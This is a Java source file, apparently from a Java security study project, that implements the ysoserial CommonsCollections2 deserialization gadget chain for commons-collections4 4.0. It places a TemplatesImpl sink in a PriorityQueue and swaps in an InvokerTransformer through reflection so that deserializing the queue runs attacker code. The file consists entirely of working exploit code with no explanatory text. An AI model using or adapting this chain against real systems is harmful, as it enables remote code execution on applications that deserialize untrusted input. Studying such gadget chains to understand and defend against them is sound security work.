package com.pacemrc.javasec.deserialize.ysoserial;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.PriorityQueue;

import com.pacemrc.javasec.utils.*;
import static com.pacemrc.javasec.deserialize.ysoserial.Sinks.getTemplatesImplSink;

/**
 * commons-collections4:4.0
 */
public class CC2 {

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = Sinks.getTemplatesImplSink();

        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(1);

        Reflections.setFieldValue(transformingComparator,"transformer",invokerTransformer);

        Deserialize.doSerialAndDeserial(priorityQueue);
    }
}
